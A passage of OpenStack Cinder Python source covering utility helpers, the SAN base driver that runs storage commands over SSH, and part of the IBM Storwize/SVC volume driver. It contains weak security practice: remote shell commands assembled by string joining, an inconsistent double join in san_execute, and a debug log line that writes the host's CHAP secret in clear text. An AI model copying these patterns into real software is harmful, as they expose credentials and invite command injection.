    revert when finished.

    One use of this is to temporarily set the read_deleted flag on a context
    object:

        with temporary_mutation(context, read_deleted=""yes""):
            do_something_that_needed_deleted_objects()
    """"""
    NOT_PRESENT = object()

    old_values = {}
    for attr, new_value in kwargs.items():
        old_values[attr] = getattr(obj, attr, NOT_PRESENT)
        setattr(obj, attr, new_value)

    try:
        yield
    finally:
        for attr, old_value in old_values.items():
            if old_value is NOT_PRESENT:
                del obj[attr]
            else:
                setattr(obj, attr, old_value)


def service_is_up(service):
    """"""Check whether a service is up based on last heartbeat.""""""
    last_heartbeat = service['updated_at'] or service['created_at']
    # Timestamps in DB are UTC.
    elapsed = total_seconds(timeutils.utcnow() - last_heartbeat)
    return abs(elapsed) <= CONF.service_down_time


def generate_mac_address():
    """"""Generate an Ethernet MAC address.""""""
    # NOTE(vish): We would prefer to use 0xfe here to ensure that linux
    #             bridge mac addresses don't change, but it appears to
    #             conflict with libvirt, so we use the next highest octet
    #             that has the unicast and locally administered bits set
    #             properly: 0xfa.
    #             Discussion: https://bugs.launchpad.net/cinder/+bug/921838
    mac = [0xfa, 0x16, 0x3e,
           random.randint(0x00, 0x7f),
           random.randint(0x00, 0xff),
           random.randint(0x00, 0xff)]
    return ':'.join(map(lambda x: ""%02x"" % x, mac))


def read_file_as_root(file_path):
    """"""Secure helper to read file as root.""""""
    try:
        out, _err = execute('cat', file_path, run_as_root=True)
        return out
    except exception.ProcessExecutionError:
        raise exception.FileNotFound(file_path=file_path)


@contextlib.contextmanager
def temporary_chown(path, owner_uid=None):
    """"""Temporarily chown a path.

    :params owner_uid: UID of temporary owner (defaults to current user)
    """"""
    if owner_uid is None:
        owner_uid = os.getuid()

    orig_uid = os.stat(path).st_uid

    if orig_uid != owner_uid:
        execute('chown', owner_uid, path, run_as_root=True)
    try:
        yield
    finally:
        if orig_uid != owner_uid:
            execute('chown', orig_uid, path, run_as_root=True)


@contextlib.contextmanager
def tempdir(**kwargs):
    tmpdir = tempfile.mkdtemp(**kwargs)
    try:
        yield tmpdir
    finally:
        try:
            shutil.rmtree(tmpdir)
        except OSError as e:
            LOG.debug(_('Could not remove tmpdir: %s'), str(e))


def strcmp_const_time(s1, s2):
    """"""Constant-time string comparison.

    :params s1: the first string
    :params s2: the second string

    :return: True if the strings are equal.

    This function takes two strings and compares them.  It is intended to be
    used when doing a comparison for authentication purposes to help guard
    against timing attacks.
    """"""
    if len(s1) != len(s2):
        return False
    result = 0
    for (a, b) in zip(s1, s2):
        result |= ord(a) ^ ord(b)
    return result == 0


def walk_class_hierarchy(clazz, encountered=None):
    """"""Walk class hierarchy, yielding most derived classes first""""""
    if not encountered:
        encountered = []
    for subclass in clazz.__subclasses__():
        if subclass not in encountered:
            encountered.append(subclass)
            # drill down to leaves first
            for subsubclass in walk_class_hierarchy(subclass, encountered):
                yield subsubclass
            yield subclass


class UndoManager(object):
    """"""Provides a mechanism to facilitate rolling back a series of actions
    when an exception is raised.
    """"""
    def __init__(self):
        self.undo_stack = []

    def undo_with(self, undo_func):
        self.undo_stack.append(undo_func)

    def _rollback(self):
        for undo_func in reversed(self.undo_stack):
            undo_func()

    def rollback_and_reraise(self, msg=None, **kwargs):
        """"""Rollback a series of actions then re-raise the exception.

        .. note:: (sirp) This should only be called within an
                  exception handler.
        """"""
        with excutils.save_and_reraise_exception():
            if msg:
                LOG.exception(msg, **kwargs)

            self._rollback()
/n/n/ncinder/volume/drivers/san/san.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4

# Copyright 2011 Justin Santa Barbara
# All Rights Reserved.
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
""""""
Default Driver for san-stored volumes.

The unique thing about a SAN is that we don't expect that we can run the volume
controller on the SAN hardware.  We expect to access it over SSH or some API.
""""""

import random

from eventlet import greenthread
from oslo.config import cfg

from cinder import exception
from cinder.openstack.common import excutils
from cinder.openstack.common import log as logging
from cinder import utils
from cinder.volume import driver

LOG = logging.getLogger(__name__)

san_opts = [
    cfg.BoolOpt('san_thin_provision',
                default=True,
                help='Use thin provisioning for SAN volumes?'),
    cfg.StrOpt('san_ip',
               default='',
               help='IP address of SAN controller'),
    cfg.StrOpt('san_login',
               default='admin',
               help='Username for SAN controller'),
    cfg.StrOpt('san_password',
               default='',
               help='Password for SAN controller',
               secret=True),
    cfg.StrOpt('san_private_key',
               default='',
               help='Filename of private key to use for SSH authentication'),
    cfg.StrOpt('san_clustername',
               default='',
               help='Cluster name to use for creating volumes'),
    cfg.IntOpt('san_ssh_port',
               default=22,
               help='SSH port to use with SAN'),
    cfg.BoolOpt('san_is_local',
                default=False,
                help='Execute commands locally instead of over SSH; '
                     'use if the volume service is running on the SAN device'),
    cfg.IntOpt('ssh_conn_timeout',
               default=30,
               help=""SSH connection timeout in seconds""),
    cfg.IntOpt('ssh_min_pool_conn',
               default=1,
               help='Minimum ssh connections in the pool'),
    cfg.IntOpt('ssh_max_pool_conn',
               default=5,
               help='Maximum ssh connections in the pool'),
]

CONF = cfg.CONF
CONF.register_opts(san_opts)


class SanDriver(driver.VolumeDriver):
    """"""Base class for SAN-style storage volumes

    A SAN-style storage value is 'different' because the volume controller
    probably won't run on it, so we need to access is over SSH or another
    remote protocol.
    """"""

    def __init__(self, *args, **kwargs):
        execute = kwargs.pop('execute', self.san_execute)
        super(SanDriver, self).__init__(execute=execute,
                                        *args, **kwargs)
        self.configuration.append_config_values(san_opts)
        self.run_local = self.configuration.san_is_local
        self.sshpool = None

    def san_execute(self, *cmd, **kwargs):
        if self.run_local:
            return utils.execute(*cmd, **kwargs)
        else:
            check_exit_code = kwargs.pop('check_exit_code', None)
            command = ' '.join(cmd)
            return self._run_ssh(command, check_exit_code)

    def _run_ssh(self, cmd_list, check_exit_code=True, attempts=1):
        utils.check_ssh_injection(cmd_list)
        command = ' '. join(cmd_list)

        if not self.sshpool:
            password = self.configuration.san_password
            privatekey = self.configuration.san_private_key
            min_size = self.configuration.ssh_min_pool_conn
            max_size = self.configuration.ssh_max_pool_conn
            self.sshpool = utils.SSHPool(self.configuration.san_ip,
                                         self.configuration.san_ssh_port,
                                         self.configuration.ssh_conn_timeout,
                                         self.configuration.san_login,
                                         password=password,
                                         privatekey=privatekey,
                                         min_size=min_size,
                                         max_size=max_size)
        last_exception = None
        try:
            total_attempts = attempts
            with self.sshpool.item() as ssh:
                while attempts > 0:
                    attempts -= 1
                    try:
                        return utils.ssh_execute(
                            ssh,
                            command,
                            check_exit_code=check_exit_code)
                    except Exception as e:
                        LOG.error(e)
                        last_exception = e
                        greenthread.sleep(random.randint(20, 500) / 100.0)
                try:
                    raise exception.ProcessExecutionError(
                        exit_code=last_exception.exit_code,
                        stdout=last_exception.stdout,
                        stderr=last_exception.stderr,
                        cmd=last_exception.cmd)
                except AttributeError:
                    raise exception.ProcessExecutionError(
                        exit_code=-1,
                        stdout="""",
                        stderr=""Error running SSH command"",
                        cmd=command)

        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_(""Error running SSH command: %s"") % command)

    def ensure_export(self, context, volume):
        """"""Synchronously recreates an export for a logical volume.""""""
        pass

    def create_export(self, context, volume):
        """"""Exports the volume.""""""
        pass

    def remove_export(self, context, volume):
        """"""Removes an export for a logical volume.""""""
        pass

    def check_for_setup_error(self):
        """"""Returns an error if prerequisites aren't met.""""""
        if not self.run_local:
            if not (self.configuration.san_password or
                    self.configuration.san_private_key):
                raise exception.InvalidInput(
                    reason=_('Specify san_password or san_private_key'))

        # The san_ip must always be set, because we use it for the target
        if not self.configuration.san_ip:
            raise exception.InvalidInput(reason=_(""san_ip must be set""))


class SanISCSIDriver(SanDriver, driver.ISCSIDriver):
    def __init__(self, *args, **kwargs):
        super(SanISCSIDriver, self).__init__(*args, **kwargs)

    def _build_iscsi_target_name(self, volume):
        return ""%s%s"" % (self.configuration.iscsi_target_prefix,
                         volume['name'])
/n/n/ncinder/volume/drivers/storwize_svc.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4

# Copyright 2013 IBM Corp.
# Copyright 2012 OpenStack LLC.
# All Rights Reserved.
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
#
# Authors:
#   Ronen Kat <ronenkat@il.ibm.com>
#   Avishay Traeger <avishay@il.ibm.com>

""""""
Volume driver for IBM Storwize family and SVC storage systems.

Notes:
1. If you specify both a password and a key file, this driver will use the
   key file only.
2. When using a key file for authentication, it is up to the user or
   system administrator to store the private key in a safe manner.
3. The defaults for creating volumes are ""-rsize 2% -autoexpand
   -grainsize 256 -warning 0"".  These can be changed in the configuration
   file or by using volume types(recommended only for advanced users).

Limitations:
1. The driver expects CLI output in English, error messages may be in a
   localized format.
2. Clones and creating volumes from snapshots, where the source and target
   are of different sizes, is not supported.

""""""

import random
import re
import string
import time

from oslo.config import cfg

from cinder import context
from cinder import exception
from cinder.openstack.common import excutils
from cinder.openstack.common import log as logging
from cinder.openstack.common import strutils
from cinder import utils
from cinder.volume.drivers.san import san
from cinder.volume import volume_types

VERSION = 1.1
LOG = logging.getLogger(__name__)

storwize_svc_opts = [
    cfg.StrOpt('storwize_svc_volpool_name',
               default='volpool',
               help='Storage system storage pool for volumes'),
    cfg.IntOpt('storwize_svc_vol_rsize',
               default=2,
               help='Storage system space-efficiency parameter for volumes '
                    '(percentage)'),
    cfg.IntOpt('storwize_svc_vol_warning',
               default=0,
               help='Storage system threshold for volume capacity warnings '
                    '(percentage)'),
    cfg.BoolOpt('storwize_svc_vol_autoexpand',
                default=True,
                help='Storage system autoexpand parameter for volumes '
                     '(True/False)'),
    cfg.IntOpt('storwize_svc_vol_grainsize',
               default=256,
               help='Storage system grain size parameter for volumes '
                    '(32/64/128/256)'),
    cfg.BoolOpt('storwize_svc_vol_compression',
                default=False,
                help='Storage system compression option for volumes'),
    cfg.BoolOpt('storwize_svc_vol_easytier',
                default=True,
                help='Enable Easy Tier for volumes'),
    cfg.IntOpt('storwize_svc_flashcopy_timeout',
               default=120,
               help='Maximum number of seconds to wait for FlashCopy to be '
                    'prepared. Maximum value is 600 seconds (10 minutes).'),
    cfg.StrOpt('storwize_svc_connection_protocol',
               default='iSCSI',
               help='Connection protocol (iSCSI/FC)'),
    cfg.BoolOpt('storwize_svc_multipath_enabled',
                default=False,
                help='Connect with multipath (currently FC-only)'),
    cfg.BoolOpt('storwize_svc_multihostmap_enabled',
                default=True,
                help='Allows vdisk to multi host mapping'),
]


CONF = cfg.CONF
CONF.register_opts(storwize_svc_opts)


class StorwizeSVCDriver(san.SanDriver):
    """"""IBM Storwize V7000 and SVC iSCSI/FC volume driver.

    Version history:
    1.0 - Initial driver
    1.1 - FC support, create_cloned_volume, volume type support,
          get_volume_stats, minor bug fixes

    """"""

    """"""=====================================================================""""""
    """""" SETUP                                                               """"""
    """"""=====================================================================""""""

    def __init__(self, *args, **kwargs):
        super(StorwizeSVCDriver, self).__init__(*args, **kwargs)
        self.configuration.append_config_values(storwize_svc_opts)
        self._storage_nodes = {}
        self._enabled_protocols = set()
        self._compression_enabled = False
        self._context = None

        # Build cleanup translation tables for host names
        invalid_ch_in_host = ''
        for num in range(0, 128):
            ch = str(chr(num))
            if (not ch.isalnum() and ch != ' ' and ch != '.'
                    and ch != '-' and ch != '_'):
                invalid_ch_in_host = invalid_ch_in_host + ch
        self._string_host_name_filter = string.maketrans(
            invalid_ch_in_host, '-' * len(invalid_ch_in_host))

        self._unicode_host_name_filter = dict((ord(unicode(char)), u'-')
                                              for char in invalid_ch_in_host)

    def _get_iscsi_ip_addrs(self):
        generator = self._port_conf_generator(['svcinfo', 'lsportip'])
        header = next(generator, None)
        if not header:
            return

        for port_data in generator:
            try:
                port_node_id = port_data['node_id']
                port_ipv4 = port_data['IP_address']
                port_ipv6 = port_data['IP_address_6']
                state = port_data['state']
            except KeyError:
                self._handle_keyerror('lsportip', header)

            if port_node_id in self._storage_nodes and (
                    state == 'configured' or state == 'online'):
                node = self._storage_nodes[port_node_id]
                if len(port_ipv4):
                    node['ipv4'].append(port_ipv4)
                if len(port_ipv6):
                    node['ipv6'].append(port_ipv6)

    def _get_fc_wwpns(self):
        for key in self._storage_nodes:
            node = self._storage_nodes[key]
            ssh_cmd = ['svcinfo', 'lsnode', '-delim', '!', node['id']]
            raw = self._run_ssh(ssh_cmd)
            resp = CLIResponse(raw, delim='!', with_header=False)
            wwpns = set(node['WWPN'])
            for i, s in resp.select('port_id', 'port_status'):
                if 'unconfigured' != s:
                    wwpns.add(i)
            node['WWPN'] = list(wwpns)
            LOG.info(_('WWPN on node %(node)s: %(wwpn)s')
                     % {'node': node['id'], 'wwpn': node['WWPN']})

    def do_setup(self, ctxt):
        """"""Check that we have all configuration details from the storage.""""""

        LOG.debug(_('enter: do_setup'))
        self._context = ctxt

        # Validate that the pool exists
        ssh_cmd = ['svcinfo', 'lsmdiskgrp', '-delim', '!', '-nohdr']
        out, err = self._run_ssh(ssh_cmd)
        self._assert_ssh_return(len(out.strip()), 'do_setup',
                                ssh_cmd, out, err)
        search_text = '!%s!' % self.configuration.storwize_svc_volpool_name
        if search_text not in out:
            raise exception.InvalidInput(
                reason=(_('pool %s doesn\'t exist')
                        % self.configuration.storwize_svc_volpool_name))

        # Check if compression is supported
        self._compression_enabled = False
        try:
            ssh_cmd = ['svcinfo', 'lslicense', '-delim', '!']
            out, err = self._run_ssh(ssh_cmd)
            license_lines = out.strip().split('\n')
            for license_line in license_lines:
                name, foo, value = license_line.partition('!')
                if name in ('license_compression_enclosures',
                            'license_compression_capacity') and value != '0':
                    self._compression_enabled = True
                    break
        except exception.ProcessExecutionError:
            LOG.exception(_('Failed to get license information.'))

        # Get the iSCSI and FC names of the Storwize/SVC nodes
        ssh_cmd = ['svcinfo', 'lsnode', '-delim', '!']
        out, err = self._run_ssh(ssh_cmd)
        self._assert_ssh_return(len(out.strip()), 'do_setup',
                                ssh_cmd, out, err)

        nodes = out.strip().split('\n')
        self._assert_ssh_return(len(nodes),
                                'do_setup', ssh_cmd, out, err)
        header = nodes.pop(0)
        for node_line in nodes:
            try:
                node_data = self._get_hdr_dic(header, node_line, '!')
            except exception.VolumeBackendAPIException:
                with excutils.save_and_reraise_exception():
                    self._log_cli_output_error('do_setup',
                                               ssh_cmd, out, err)
            node = {}
            try:
                node['id'] = node_data['id']
                node['name'] = node_data['name']
                node['IO_group'] = node_data['IO_group_id']
                node['iscsi_name'] = node_data['iscsi_name']
                node['WWNN'] = node_data['WWNN']
                node['status'] = node_data['status']
                node['WWPN'] = []
                node['ipv4'] = []
                node['ipv6'] = []
                node['enabled_protocols'] = []
                if node['status'] == 'online':
                    self._storage_nodes[node['id']] = node
            except KeyError:
                self._handle_keyerror('lsnode', header)

        # Get the iSCSI IP addresses and WWPNs of the Storwize/SVC nodes
        self._get_iscsi_ip_addrs()
        self._get_fc_wwpns()

        # For each node, check what connection modes it supports.  Delete any
        # nodes that do not support any types (may be partially configured).
        to_delete = []
        for k, node in self._storage_nodes.iteritems():
            if ((len(node['ipv4']) or len(node['ipv6']))
                    and len(node['iscsi_name'])):
                node['enabled_protocols'].append('iSCSI')
                self._enabled_protocols.add('iSCSI')
            if len(node['WWPN']):
                node['enabled_protocols'].append('FC')
                self._enabled_protocols.add('FC')
            if not len(node['enabled_protocols']):
                to_delete.append(k)

        for delkey in to_delete:
            del self._storage_nodes[delkey]

        # Make sure we have at least one node configured
        self._driver_assert(len(self._storage_nodes),
                            _('do_setup: No configured nodes'))

        LOG.debug(_('leave: do_setup'))

    def _build_default_opts(self):
        # Ignore capitalization
        protocol = self.configuration.storwize_svc_connection_protocol
        if protocol.lower() == 'fc':
            protocol = 'FC'
        elif protocol.lower() == 'iscsi':
            protocol = 'iSCSI'

        opt = {'rsize': self.configuration.storwize_svc_vol_rsize,
               'warning': self.configuration.storwize_svc_vol_warning,
               'autoexpand': self.configuration.storwize_svc_vol_autoexpand,
               'grainsize': self.configuration.storwize_svc_vol_grainsize,
               'compression': self.configuration.storwize_svc_vol_compression,
               'easytier': self.configuration.storwize_svc_vol_easytier,
               'protocol': protocol,
               'multipath': self.configuration.storwize_svc_multipath_enabled}
        return opt

    def check_for_setup_error(self):
        """"""Ensure that the flags are set properly.""""""
        LOG.debug(_('enter: check_for_setup_error'))

        required_flags = ['san_ip', 'san_ssh_port', 'san_login',
                          'storwize_svc_volpool_name']
        for flag in required_flags:
            if not self.configuration.safe_get(flag):
                raise exception.InvalidInput(reason=_('%s is not set') % flag)

        # Ensure that either password or keyfile were set
        if not (self.configuration.san_password or
                self.configuration.san_private_key):
            raise exception.InvalidInput(
                reason=_('Password or SSH private key is required for '
                         'authentication: set either san_password or '
                         'san_private_key option'))

        # Check that flashcopy_timeout is not more than 10 minutes
        flashcopy_timeout = self.configuration.storwize_svc_flashcopy_timeout
        if not (flashcopy_timeout > 0 and flashcopy_timeout <= 600):
            raise exception.InvalidInput(
                reason=_('Illegal value %d specified for '
                         'storwize_svc_flashcopy_timeout: '
                         'valid values are between 0 and 600')
                % flashcopy_timeout)

        opts = self._build_default_opts()
        self._check_vdisk_opts(opts)

        LOG.debug(_('leave: check_for_setup_error'))

    """"""=====================================================================""""""
    """""" INITIALIZE/TERMINATE CONNECTIONS                                    """"""
    """"""=====================================================================""""""

    def ensure_export(self, ctxt, volume):
        """"""Check that the volume exists on the storage.

        The system does not ""export"" volumes as a Linux iSCSI target does,
        and therefore we just check that the volume exists on the storage.
        """"""
        volume_defined = self._is_vdisk_defined(volume['name'])
        if not volume_defined:
            LOG.error(_('ensure_export: Volume %s not found on storage')
                      % volume['name'])

    def create_export(self, ctxt, volume):
        model_update = None
        return model_update

    def remove_export(self, ctxt, volume):
        pass

    def _add_chapsecret_to_host(self, host_name):
        """"""Generate and store a randomly-generated CHAP secret for the host.""""""

        chap_secret = utils.generate_password()
        ssh_cmd = ['svctask', 'chhost', '-chapsecret', chap_secret, host_name]
        out, err = self._run_ssh(ssh_cmd)
        # No output should be returned from chhost
        self._assert_ssh_return(len(out.strip()) == 0,
                                '_add_chapsecret_to_host', ssh_cmd, out, err)
        return chap_secret

    def _get_chap_secret_for_host(self, host_name):
        """"""Return the CHAP secret for the given host.""""""

        LOG.debug(_('enter: _get_chap_secret_for_host: host name %s')
                  % host_name)

        ssh_cmd = ['svcinfo', 'lsiscsiauth', '-delim', '!']
        out, err = self._run_ssh(ssh_cmd)

        if not len(out.strip()):
            return None

        host_lines = out.strip().split('\n')
        self._assert_ssh_return(len(host_lines), '_get_chap_secret_for_host',
                                ssh_cmd, out, err)

        header = host_lines.pop(0).split('!')
        self._assert_ssh_return('name' in header, '_get_chap_secret_for_host',
                                ssh_cmd, out, err)
        self._assert_ssh_return('iscsi_auth_method' in header,
                                '_get_chap_secret_for_host', ssh_cmd, out, err)
        self._assert_ssh_return('iscsi_chap_secret' in header,
                                '_get_chap_secret_for_host', ssh_cmd, out, err)
        name_index = header.index('name')
        method_index = header.index('iscsi_auth_method')
        secret_index = header.index('iscsi_chap_secret')

        chap_secret = None
        host_found = False
        for line in host_lines:
            info = line.split('!')
            if info[name_index] == host_name:
                host_found = True
                if info[method_index] == 'chap':
                    chap_secret = info[secret_index]

        self._assert_ssh_return(host_found, '_get_chap_secret_for_host',
                                ssh_cmd, out, err)

        LOG.debug(_('leave: _get_chap_secret_for_host: host name '
                    '%(host_name)s with secret %(chap_secret)s')
                  % {'host_name': host_name, 'chap_secret': chap_secret})

        return chap_secret

    def _connector_to_hostname_prefix(self, connector):
        """"""Translate connector info to storage system host name.

        Translate a host's name and IP to the prefix of its hostname on the
        storage subsystem.  We create a host name host name from the host and
        IP address, replacing any invalid characters (at most 55 characters),
        and adding a random 8-character suffix to avoid collisions. The total
        length should be at most 63 characters.

        """"""

        host_name = connector['host']
        if isinstance(host_name, unicode):
            host_name = host_name.translate(self._unicode_host_name_filter)
        elif isinstance(host_name, str):
            host_name = host_name.translate(self._string_host_name_filter)
        else:
            msg = _('_create_host: Cannot clean host name. Host name '
                    'is not unicode or string')
            LOG.error(msg)
            raise exception.NoValidHost(reason=msg)

        host_name = str(host_name)
        return host_name[:55]

    def _find_host_from_wwpn(self, connector):
        for wwpn in connector['wwpns']:
            ssh_cmd = ['svcinfo', 'lsfabric', '-wwpn', wwpn, '-delim', '!']
            out, err = self._run_ssh(ssh_cmd)

            if not len(out.strip()):
                # This WWPN is not in use
                continue

            host_lines = out.strip().split('\n')
            header = host_lines.pop(0).split('!')
            self._assert_ssh_return('remote_wwpn' in header and
                                    'name' in header,
                                    '_find_host_from_wwpn',
                                    ssh_cmd, out, err)
            rmt_wwpn_idx = header.index('remote_wwpn')
            name_idx = header.index('name')

            wwpns = map(lambda x: x.split('!')[rmt_wwpn_idx], host_lines)

            if wwpn in wwpns:
                # All the wwpns will be the mapping for the same
                # host from this WWPN-based query. Just pick
                # the name from first line.
                hostname = host_lines[0].split('!')[name_idx]
                return hostname

        # Didn't find a host
        return None

    def _find_host_exhaustive(self, connector, hosts):
        for host in hosts:
            ssh_cmd = ['svcinfo', 'lshost', '-delim', '!', host]
            out, err = self._run_ssh(ssh_cmd)
            self._assert_ssh_return(len(out.strip()),
                                    '_find_host_exhaustive',
                                    ssh_cmd, out, err)
            for attr_line in out.split('\n'):
                # If '!' not found, return the string and two empty strings
                attr_name, foo, attr_val = attr_line.partition('!')
                if (attr_name == 'iscsi_name' and
                        'initiator' in connector and
                        attr_val == connector['initiator']):
                    return host
                elif (attr_name == 'WWPN' and
                      'wwpns' in connector and
                      attr_val.lower() in
                      map(str.lower, map(str, connector['wwpns']))):
                        return host
        return None

    def _get_host_from_connector(self, connector):
        """"""List the hosts defined in the storage.

        Return the host name with the given connection info, or None if there
        is no host fitting that information.

        """"""

        prefix = self._connector_to_hostname_prefix(connector)
        LOG.debug(_('enter: _get_host_from_connector: prefix %s') % prefix)

        # Get list of host in the storage
        ssh_cmd = ['svcinfo', 'lshost', '-delim', '!']
        out, err = self._run_ssh(ssh_cmd)

        if not len(out.strip()):
            return None

        # If we have FC information, we have a faster lookup option
        hostname = None
        if 'wwpns' in connector:
            hostname = self._find_host_from_wwpn(connector)

        # If we don't have a hostname yet, try the long way
        if not hostname:
            host_lines = out.strip().split('\n')
            self._assert_ssh_return(len(host_lines),
                                    '_get_host_from_connector',
                                    ssh_cmd, out, err)
            header = host_lines.pop(0).split('!')
            self._assert_ssh_return('name' in header,
                                    '_get_host_from_connector',
                                    ssh_cmd, out, err)
            name_index = header.index('name')
            hosts = map(lambda x: x.split('!')[name_index], host_lines)
            hostname = self._find_host_exhaustive(connector, hosts)

        LOG.debug(_('leave: _get_host_from_connector: host %s') % hostname)

        return hostname

    def _create_host(self, connector):
        """"""Create a new host on the storage system.

        We create a host name and associate it with the given connection
        information.

        """"""

        LOG.debug(_('enter: _create_host: host %s') % connector['host'])

        rand_id = str(random.randint(0, 99999999)).zfill(8)
        host_name = '%s-%s' % (self._connector_to_hostname_prefix(connector),
                               rand_id)

        # Get all port information from the connector
        ports = []
        if 'initiator' in connector:
            ports.append('-iscsiname %s' % connector['initiator'])
        if 'wwpns' in connector:
            for wwpn in connector['wwpns']:
                ports.append('-hbawwpn %s' % wwpn)

        # When creating a host, we need one port
        self._driver_assert(len(ports), _('_create_host: No connector ports'))
        port1 = ports.pop(0)
        arg_name, arg_val = port1.split()
        ssh_cmd = ['svctask', 'mkhost', '-force', arg_name, arg_val, '-name',
                   '""%s""' % host_name]
        out, err = self._run_ssh(ssh_cmd)
        self._assert_ssh_return('successfully created' in out,
                                '_create_host', ssh_cmd, out, err)

        # Add any additional ports to the host
        for port in ports:
            arg_name, arg_val = port.split()
            ssh_cmd = ['svctask', 'addhostport', '-force', arg_name, arg_val,
                       host_name]
            out, err = self._run_ssh(ssh_cmd)

        LOG.debug(_('leave: _create_host: host %(host)s - %(host_name)s') %
                  {'host': connector['host'], 'host_name': host_name})
        return host_name

    def _get_hostvdisk_mappings(self, host_name):
        """"""Return the defined storage mappings for a host.""""""

        return_data = {}
        ssh_cmd = ['svcinfo', 'lshostvdiskmap', '-delim', '!', host_name]
        out, err = self._run_ssh(ssh_cmd)

        mappings = out.strip().split('\n')
        if len(mappings):
            header = mappings.pop(0)
            for mapping_line in mappings:
                mapping_data = self._get_hdr_dic(header, mapping_line, '!')
                return_data[mapping_data['vdisk_name']] = mapping_data

        return return_data

    def _map_vol_to_host(self, volume_name, host_name):
        """"""Create a mapping between a volume to a host.""""""

        LOG.debug(_('enter: _map_vol_to_host: volume %(volume_name)s to '
                    'host %(host_name)s')
                  % {'volume_name': volume_name, 'host_name': host_name})

        # Check if this volume is already mapped to this host
        mapping_data = self._get_hostvdisk_mappings(host_name)

        mapped_flag = False
        result_lun = '-1'
        if volume_name in mapping_data:
            mapped_flag = True
            result_lun = mapping_data[volume_name]['SCSI_id']
        else:
            lun_used = [int(v['SCSI_id']) for v in mapping_data.values()]
            lun_used.sort()
            # Assume all luns are taken to this point, and then try to find
            # an unused one
            result_lun = str(len(lun_used))
            for index, n in enumerate(lun_used):
                if n > index:
                    result_lun = str(index)
                    break

        # Volume is not mapped to host, create a new LUN
        if not mapped_flag:
            ssh_cmd = ['svctask', 'mkvdiskhostmap', '-host', host_name,
                       '-scsi', result_lun, volume_name]
            out, err = self._run_ssh(ssh_cmd, check_exit_code=False)
            if err and err.startswith('CMMVC6071E'):
                if not self.configuration.storwize_svc_multihostmap_enabled:
                    LOG.error(_('storwize_svc_multihostmap_enabled is set '
                                'to False, Not allow multi host mapping'))
                    exception_msg = 'CMMVC6071E The VDisk-to-host mapping '\
                                    'was not created because the VDisk is '\
                                    'already mapped to a host.\n""'
                    raise exception.CinderException(data=exception_msg)

                for i in range(len(ssh_cmd)):
                    if ssh_cmd[i] == 'mkvdiskhostmap':
                        ssh_cmd.insert(i + 1, '-force')

                # try to map one volume to multiple hosts
                out, err = self._run_ssh(ssh_cmd)
                LOG.warn(_('volume %s mapping to multi host') % volume_name)
                self._assert_ssh_return('successfully created' in out,
                                        '_map_vol_to_host', ssh_cmd, out, err)
            else:
                self._assert_ssh_return('successfully created' in out,
                                        '_map_vol_to_host', ssh_cmd, out, err)
        LOG.debug(_('leave: _map_vol_to_host: LUN %(result_lun)s, volume '
                    '%(volume_name)s, host %(host_name)s') %
                  {'result_lun': result_lun,
                   'volume_name': volume_name,
                   'host_name': host_name})
        return result_lun

    def _delete_host(self, host_name):
        """"""Delete a host on the storage system.""""""

        LOG.debug(_('enter: _delete_host: host %s ') % host_name)

        ssh_cmd = ['svctask', 'rmhost', host_name]
        out, err = self._run_ssh(ssh_cmd)
        # No output should be returned from rmhost
        self._assert_ssh_return(len(out.strip()) == 0,
                                '_delete_host', ssh_cmd, out, err)

        LOG.debug(_('leave: _delete_host: host %s ') % host_name)

    def _get_conn_fc_wwpns(self, host_name):
        wwpns = []
        cmd = ['svcinfo', 'lsfabric', '-host', host_name]
        generator = self._port_conf_generator(cmd)
        header = next(generator, None)
        if not header:
            return wwpns

        for port_data in generator:
            try:
                wwpns.append(port_data['local_wwpn'])
            except KeyError as e:
                self._handle_keyerror('lsfabric', header)

        return wwpns

    def validate_connector(self, connector):
        """"""Check connector for at least one enabled protocol (iSCSI/FC).""""""
        valid = False
        if 'iSCSI' in self._enabled_protocols and 'initiator' in connector:
            valid = True
        if 'FC' in self._enabled_protocols and 'wwpns' in connector:
            valid = True
        if not valid:
            err_msg = (_('The connector does not contain the required '
                         'information.'))
            LOG.error(err_msg)
            raise exception.VolumeBackendAPIException(data=err_msg)

    def initialize_connection(self, volume, connector):
        """"""Perform the necessary work so that an iSCSI/FC connection can
        be made.

        To be able to create an iSCSI/FC connection from a given host to a
        volume, we must:
        1. Translate the given iSCSI name or WWNN to a host name
        2. Create new host on the storage system if it does not yet exist
        3. Map the volume to the host if it is not already done
        4. Return the connection information for relevant nodes (in the
           proper I/O group)

        """"""

        LOG.debug(_('enter: initialize_connection: volume %(vol)s with '
                    'connector %(conn)s') % {'vol': str(volume),
                                             'conn': str(connector)})

        vol_opts = self._get_vdisk_params(volume['volume_type_id'])
        host_name = connector['host']
        volume_name = volume['name']

        # Check if a host object is defined for this host name
        host_name = self._get_host_from_connector(connector)
        if host_name is None:
            # Host does not exist - add a new host to Storwize/SVC
            host_name = self._create_host(connector)
            # Verify that create_new_host succeeded
            self._driver_assert(
                host_name is not None,
                _('_create_host failed to return the host name.'))

        if vol_opts['protocol'] == 'iSCSI':
            chap_secret = self._get_chap_secret_for_host(host_name)
            if chap_secret is None:
                chap_secret = self._add_chapsecret_to_host(host_name)

        volume_attributes = self._get_vdisk_attributes(volume_name)
        lun_id = self._map_vol_to_host(volume_name, host_name)

        self._driver_assert(volume_attributes is not None,
                            _('initialize_connection: Failed to get attributes'
                              ' for volume %s') % volume_name)

        try:
            preferred_node = volume_attributes['preferred_node_id']
            IO_group = volume_attributes['IO_group_id']
        except KeyError as e:
                LOG.error(_('Did not find expected column name in '
                            'lsvdisk: %s') % str(e))
                exception_msg = (_('initialize_connection: Missing volume '
                                   'attribute for volume %s') % volume_name)
